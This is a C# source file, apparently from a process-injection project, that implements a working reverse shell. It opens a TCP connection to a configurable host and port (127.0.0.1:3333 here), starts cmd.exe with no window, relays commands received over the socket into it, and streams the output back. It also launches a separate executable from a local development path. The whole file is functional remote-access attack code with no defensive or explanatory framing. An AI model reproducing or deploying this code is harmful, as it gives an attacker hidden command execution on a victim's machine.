using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace ShellCode
{
    public class Program
    {
        public static StreamWriter streamWriter;


        public static void Main(string[] args)
        {
            File.WriteAllText("asd.txt", "start");

            //while (true)
            //{
            int delay = 3000;
            string ip = "127.0.0.1";
            int port = 3333;
            Process.Start(@"D:\Users\Razali\Source\Repos\ProcessInjector.NET\ProcessInjector\SimpleConsole\bin\Release\SimpleConsole.exe");
            Console.WriteLine($"Connecting to {ip}:{port} in {delay / 1000} seconds...");
            File.AppendAllText("asd.txt", "gg");

            try
            {
                using (TcpClient client = new TcpClient(ip, port))
                {
                    
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);

                            StringBuilder strInput = new StringBuilder();

                            Process process = new Process()
                            {
                                StartInfo = new ProcessStartInfo()
                                {
                                    FileName = "cmd.exe",
                                    CreateNoWindow = true,
                                    UseShellExecute = false,
                                    RedirectStandardOutput = true,
                                    RedirectStandardError = true,
                                    RedirectStandardInput = true
                                },

                            };
                            process.OutputDataReceived += new DataReceivedEventHandler(OutputDataReceivedHandler);
                            process.Start();
                            process.BeginOutputReadLine();

                            while (true)
                            {
                                strInput.Append(rdr.ReadLine());
                                process.StandardInput.WriteLine(strInput);
                                strInput.Remove(0, strInput.Length);
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);

            }
            //}
        }

        private static void OutputDataReceivedHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }
    }
}
